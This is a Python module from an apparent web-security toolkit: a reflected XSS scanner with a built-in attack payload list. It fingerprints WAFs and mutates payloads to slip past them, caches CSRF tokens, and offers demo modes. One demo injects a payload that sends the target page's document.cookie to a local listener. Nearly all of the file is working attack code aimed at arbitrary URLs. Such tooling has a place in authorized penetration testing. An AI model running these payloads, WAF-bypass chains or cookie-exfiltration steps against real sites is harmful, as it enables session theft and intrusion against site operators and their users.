"""
Reflected XSS detector and demonstration.

Detects reflected XSS, verifies execution in a headless browser, and
provides two demonstration modes:

  --demo-cookie  : renders document.cookie on the page (alert or DOM).
                   No network calls.
  --demo-exfil   : sends document.cookie to a listener this toolkit
                   starts on 127.0.0.1. The value never leaves the
                   machine running the toolkit.

Detection only for real findings. Demonstration modes are opt-in.
"""

import asyncio
import secrets
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.http import new_session, fetch, RateLimiter, parse_cookie_string
from core.output import info, success, warn, error

from evade.waf_bypass import (
    XSS_TAMPERS,
    fingerprint_waf,
    pick_tampers_for_fingerprint,
    enumerate_tamper_sequences,
)


# ---------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------

PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
]

ESCAPE_MARKERS = ["&lt;", "&gt;", "&quot;", "&#60;", "&#x3c;", "&#34;"]

WAF_SIGNATURES = [
    "mod_security", "modsecurity", "owasp_crs", "owasp crs",
    "not acceptable", "the requested url was rejected",
    "your support id is",
    "cloudflare", "incapsula", "sucuri cloudproxy", "akamai",
    "imperva", "f5 networks", "barracuda", "fortiweb",
    "wallarm", "stackpath", "aws waf", "awselb",
    "wordfence", "all in one wp security",
    "request blocked", "access denied", "forbidden",
    "security policy", "malicious request", "attack detected",
    "suspicious activity", "blocked by",
]

CSRF_PATTERNS = [
    "csrf", "_token", "authenticity_token", "__requestverificationtoken",
    "xsrf", "anticsrf", "csrfmiddlewaretoken", "verification_token", "nonce",
]

MAX_CONCURRENT_REQUESTS = 5

# Module-level: last WAF fingerprint seen. Set by test_url() when
# evade=True; used by _send() to pick the tamper set.
_LAST_WAF_FINGERPRINT = None


# ---------------------------------------------------------------------
# CSRF token jar (query-string only for this module)
# ---------------------------------------------------------------------

import re as _re

_HIDDEN_INPUT_RE = _re.compile(
    r"""<input[^>]*\bname\s*=\s*["']([^"']+)["'][^>]*\bvalue\s*=\s*["']([^"']*)["']""",
    _re.IGNORECASE | _re.DOTALL,
)
_HIDDEN_INPUT_RE_REV = _re.compile(
    r"""<input[^>]*\bvalue\s*=\s*["']([^"']*)["'][^>]*\bname\s*=\s*["']([^"']+)["']""",
    _re.IGNORECASE | _re.DOTALL,
)
_META_RE = _re.compile(
    r"""<meta[^>]*\bname\s*=\s*["']([^"']+)["'][^>]*\bcontent\s*=\s*["']([^"']*)["']""",
    _re.IGNORECASE | _re.DOTALL,
)


class TokenJar:
    def __init__(self):
        self.tokens = {}

    def update(self, found):
        if found:
            self.tokens.update({k.lower(): v for k, v in found.items()})

    def get(self, name):
        return self.tokens.get((name or "").lower())

    def __bool__(self):
        return bool(self.tokens)


def _looks_like_csrf(name):
    low = (name or "").lower()
    return any(p in low for p in CSRF_PATTERNS)


def find_tokens(body, headers=None):
    found = {}
    if body:
        for m in _HIDDEN_INPUT_RE.finditer(body):
            n, v = m.group(1), m.group(2)
            if _looks_like_csrf(n):
                found[n] = v
        for m in _HIDDEN_INPUT_RE_REV.finditer(body):
            v, n = m.group(1), m.group(2)
            if _looks_like_csrf(n):
                found[n] = v
        for m in _META_RE.finditer(body):
            n, v = m.group(1), m.group(2)
            if _looks_like_csrf(n):
                found[n] = v
    if headers:
        for hn, hv in headers.items():
            if _looks_like_csrf(hn):
                found[hn] = hv
    return found


def _apply_tokens(url, jar):
    if not jar or not jar.tokens:
        return url
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    changed = False
    for k in list(qs.keys()):
        tok = jar.get(k)
        if tok is not None:
            qs[k] = [tok]
            changed = True
    if not changed:
        return url
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, urlencode(qs, doseq=True), parsed.fragment,
    ))


# ---------------------------------------------------------------------
# Adaptive limiter
# ---------------------------------------------------------------------

class AdaptiveLimiter:
    def __init__(self, base):
        self.base = base
        self.backoff = 1.0
        self.clean_streak = 0

    async def wait(self):
        if self.backoff > 1.0:
            await asyncio.sleep((self.backoff - 1.0) / max(self.base.rate, 0.1))
        await self.base.wait()

    def observe(self, status):
        if status in (429, 503):
            self.backoff = min(self.backoff * 2.0, 64.0)
            self.clean_streak = 0
        elif status is not None and status < 400:
            self.clean_streak += 1
            if self.clean_streak >= 20:
                self.backoff = 1.0
                self.clean_streak = 0


# ---------------------------------------------------------------------
# HTTP with WAF evasion
# ---------------------------------------------------------------------

def _looks_blocked(status, body, baseline_len=None):
    if status in (403, 406, 419, 429, 501, 502, 503):
        return True
    if body is None:
        return True
    low = body.lower()
    for sig in WAF_SIGNATURES:
        if sig in low:
            return True
    if baseline_len:
        if len(body) < 100:
            return True
        if abs(len(body) - baseline_len) > 4 * baseline_len:
            return True
    return False


def _first_param_name(query_string):
    """Return the first query-string parameter name, or ''."""
    parsed = parse_qs(query_string, keep_blank_values=True)
    for k in parsed.keys():
        return k
    return ""


def _extract_first_param_value(query_string):
    """Return the first query-string parameter's value, or ''."""
    parsed = parse_qs(query_string, keep_blank_values=True)
    for vs in parsed.values():
        if vs:
            return vs[0]
    return ""


async def _send(session, url, limiter, cookies=None, jar=None,
                evade=False, baseline_len=None, verbose=False):
    if jar:
        url = _apply_tokens(url, jar)

    if not evade:
        status, headers, body, _ = await fetch(
            session, url, limiter.base, cookies=cookies)
        if body is None:
            return None
        limiter.observe(status)
        return status, headers, body, "identity"

    parsed = urlparse(url)
    base_qs = parse_qs(parsed.query, keep_blank_values=True)

    fingerprint = _LAST_WAF_FINGERPRINT

    if fingerprint is None or fingerprint.get("detected") == "none":
        status, headers, body, _ = await fetch(
            session, url, limiter.base, cookies=cookies)
        if body is None:
            return None
        limiter.observe(status)
        return status, headers, body, "identity"

    tamper_names = pick_tampers_for_fingerprint(fingerprint, "xss")

    first_param = _first_param_name(parsed.query)
    raw_value = _extract_first_param_value(parsed.query)

    for chain, mutated_value in enumerate_tamper_sequences(
            raw_value, tamper_names, depth=1, max_sequences=60,
            protocol="xss"):
        mutated_qs = {
            k: [mutated_value if k == first_param else v
                for v in vs]
            for k, vs in base_qs.items()
        }
        mutated_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(mutated_qs, doseq=True), parsed.fragment,
        ))
        status, headers, body, _ = await fetch(
            session, mutated_url, limiter.base, cookies=cookies)
        if body is None:
            continue
        limiter.observe(status)
        if not _looks_blocked(status, body, baseline_len):
            chain_name = ",".join(chain)
            if chain_name != "identity" and verbose:
                info(f"waf bypass: {chain_name!r} worked")
            return status, headers, body, chain_name
        if verbose:
            info(f"waf: tamper {chain_name!r} blocked")

    warn("waf: all tampers blocked")
    return None


# ---------------------------------------------------------------------
# URL helpers
# ---------------------------------------------------------------------

def _unique(prefix="tkxss"):
    return f"{prefix}{secrets.token_hex(4)}"


def inject_param(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, urlencode(qs, doseq=True), parsed.fragment,
    ))


# ---------------------------------------------------------------------
# CSP check
# ---------------------------------------------------------------------

def _csp_severity(headers):
    csp = ""
    for k, v in (headers or {}).items():
        if k.lower() == "content-security-policy":
            csp = v
            break
    if not csp:
        return "absent", ""
    low = csp.lower()
    if "script-src 'none'" in low:
        return "none", csp
    if "script-src" in low and "unsafe-inline" not in low:
        return "strict", csp
    if "unsafe-inline" in low:
        return "weak", csp
    return "absent", csp


# ---------------------------------------------------------------------
# Reflection checks
# ---------------------------------------------------------------------

async def check_reflection(session, limiter, url, param, cookies=None,
                          jar=None, verbose=False):
    benign = _unique("reflect")
    test_url = inject_param(url, param, benign)
    r = await _send(session, test_url, limiter, cookies=cookies, jar=jar,
                    verbose=verbose)
    if r is None:
        return False, benign
    return benign in r[2], benign


async def check_executable_reflection(session, limiter, url, param, payload,
                                      cookies=None, jar=None,
                                      evade=False, baseline_len=None,
                                      verbose=False):
    test_url = inject_param(url, param, payload)
    r = await _send(session, test_url, limiter, cookies=cookies, jar=jar,
                    evade=evade, baseline_len=baseline_len, verbose=verbose)
    if r is None:
        return False, False, None, ""

    status, headers, body, mutation = r

    if mutation == "identity" or mutation is None:
        needle = payload
    else:
        needle = "alert"

    verbatim = needle in body

    escaped = False
    if not verbatim:
        for esc in ESCAPE_MARKERS:
            if esc in body:
                escaped = True
                break

    snippet = ""
    if verbatim:
        idx = body.find(needle)
        snippet = body[max(0, idx - 40):idx + len(needle) + 40]

    return verbatim, escaped, mutation, snippet


# ---------------------------------------------------------------------
# Main detector
# ---------------------------------------------------------------------

async def test_url(url, session, rate_limiter, cookies=None, verbose=False,
                   evade=False, check_csp=True):
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
    if not params:
        return []

    if isinstance(cookies, str):
        cookies = parse_cookie_string(cookies)

    limiter = AdaptiveLimiter(rate_limiter)
    jar = TokenJar()

    r0 = await _send(session, url, limiter, cookies=cookies, verbose=verbose)
    if r0 is None:
        warn(f"baseline fetch failed for {url}")
        return []
    baseline_len = len(r0[2]) if r0[2] else None
    base_headers = r0[1] or {}

    global _LAST_WAF_FINGERPRINT
    if evade:
        _LAST_WAF_FINGERPRINT = await fingerprint_waf(
            session, url, limiter, cookies=cookies, verbose=verbose)

    found = find_tokens(r0[2], base_headers)
    if found:
        jar.update(found)
        if verbose:
            info(f"csrf: cached {len(found)} token(s): "
                 f"{', '.join(found.keys())}")

    csp_level, csp_str = ("absent", "")
    if check_csp:
        csp_level, csp_str = _csp_severity(base_headers)
        if verbose and csp_level != "absent":
            info(f"csp: {csp_level} ({csp_str[:80]!r})")

    findings = []

    for param in params:
        reflected, _ = await check_reflection(
            session, limiter, url, param, cookies=cookies, jar=jar,
            verbose=verbose)
        if not reflected:
            if verbose:
                info(f"param {param!r}: no reflection, skipping")
            continue

        if verbose:
            info(f"param {param!r}: reflects, testing payloads")

        reflected_escaped = False
        for payload in PAYLOADS:
            verbatim, escaped, mutation, snippet = await check_executable_reflection(
                session, limiter, url, param, payload,
                cookies=cookies, jar=jar, evade=evade,
                baseline_len=baseline_len, verbose=verbose)

            if verbatim:
                severity = "medium"
                note = ""
                if csp_level == "none":
                    severity = "low"
                    note = " (CSP blocks inline scripts)"
                elif csp_level == "strict":
                    severity = "low"
                    note = " (CSP restricts script-src)"

                finding = {
                    "type": "xss",
                    "severity": severity,
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": f"payload reflected verbatim{note}: "
                                f"{snippet[:120]!r}",
                }
                if mutation and mutation != "identity":
                    finding["mutation_used"] = mutation
                if csp_level != "absent":
                    finding["csp_level"] = csp_level
                findings.append(finding)

                if verbose:
                    success(f"XSS candidate: param={param!r} "
                            f"payload={payload!r}"
                            + (f" mut={mutation}" if mutation and mutation != "identity" else ""))
                break

            if escaped:
                reflected_escaped = True
        else:
            if reflected_escaped and verbose:
                info(f"param {param!r}: reflections are escaped; not vulnerable")
            elif verbose:
                warn(f"param {param!r}: no unescaped reflection")

    if jar:
        findings.append({
            "type": "csrf_tokens",
            "note": "tokens were cached during the scan",
            "tokens": sorted(jar.tokens.keys()),
        })

    return findings


# ---------------------------------------------------------------------
# CLI entry (used by toolkit.py --xss)
# ---------------------------------------------------------------------

async def run(url, cookies=None, rate=5.0, verbose=False, evade=False):
    info(f"XSS detector on {url} (rate={rate}/s"
         + (", evade=on" if evade else "")
         + ")")
    warn("detection only — reflected XSS; DOM-based is out of scope")

    rl = RateLimiter(rate)
    async with new_session() as session:
        findings = await test_url(url, session, rl, cookies=cookies,
                                  verbose=verbose, evade=evade)

    report = [f for f in findings if f.get("type") != "csrf_tokens"]
    csrf_record = next((f for f in findings if f.get("type") == "csrf_tokens"), None)

    print()
    if report:
        success(f"found {len(report)} XSS candidate(s)")
        for f in report:
            mut = f" mut={f['mutation_used']}" if "mutation_used" in f else ""
            csp = f" csp={f['csp_level']}" if "csp_level" in f else ""
            print(f"  [{f['severity']}] param={f['parameter']!r}{mut}{csp}")
            print(f"      {f['evidence']}")
    else:
        info("no XSS reflections detected")

    if csrf_record and csrf_record.get("tokens"):
        info(f"csrf tokens cached: {', '.join(csrf_record['tokens'])}")

    return findings


# ---------------------------------------------------------------------
# Demonstration modes (used by toolkit.py --demo-cookie / --demo-exfil)
# ---------------------------------------------------------------------

async def run_cookie_demo(url, cookies=None, rate=5.0, verbose=False):
    """DOM-display demo: alert(document.cookie). No network call."""
    from vuln import xss_browser

    rl = RateLimiter(rate)
    async with new_session() as session:
        findings = await test_url(url, session, rl, cookies=cookies,
                                  verbose=verbose)

    real = [f for f in findings if f.get("type") == "xss"]
    if not real:
        warn("no XSS reflection found; nothing to demonstrate")
        return None

    param = real[0]["parameter"]
    payload = xss_browser.DOM_DISPLAY_PAYLOADS[1]
    target = inject_param(url, param, payload)

    info(f"loading demo payload in headless browser (param={param!r})...")
    text, err = await xss_browser.verify_dom_display(target, verbose=verbose)
    if err:
        warn(f"browser error: {err}")
        return None
    if not text:
        warn("no alert fired; cookie may be empty or payload blocked")
        return None

    success(f"browser alert: {text}")
    return text


async def run_exfil_demo(url, cookies=None, rate=5.0, verbose=False):
    """Localhost-only exfiltration demo. Starts a listener on 127.0.0.1,
    injects a payload that sends document.cookie to it, then verifies the
    listener received the value. Nothing leaves the machine."""
    from vuln import xss_browser

    rl = RateLimiter(rate)
    async with new_session() as session:
        findings = await test_url(url, session, rl, cookies=cookies,
                                  verbose=verbose)

    real = [f for f in findings if f.get("type") == "xss"]
    if not real:
        warn("no XSS reflection found; nothing to demonstrate")
        return None

    param = real[0]["parameter"]

    listener = xss_browser.LocalListener()
    port = await listener.start()
    info(f"local listener started on 127.0.0.1:{port}")

    try:
        payload = xss_browser.build_exfil_payload(port)
        target = inject_param(url, param, payload)
        info(f"injecting exfil payload into param {param!r}")

        await xss_browser.verify_execution(target, verbose=verbose)

        for _ in range(80):
            if listener.hits:
                break
            await asyncio.sleep(0.1)
    finally:
        await listener.stop()

    if not listener.hits:
        warn("listener received no requests (payload may not have fired)")
        return None

    _, query = listener.hits[0]
    cookie_value = ""
    for kv in query.split("&"):
        if kv.startswith("c="):
            cookie_value = urllib.parse.unquote(kv[2:])
            break

    success(f"listener received cookie: {cookie_value!r}")
    return cookie_value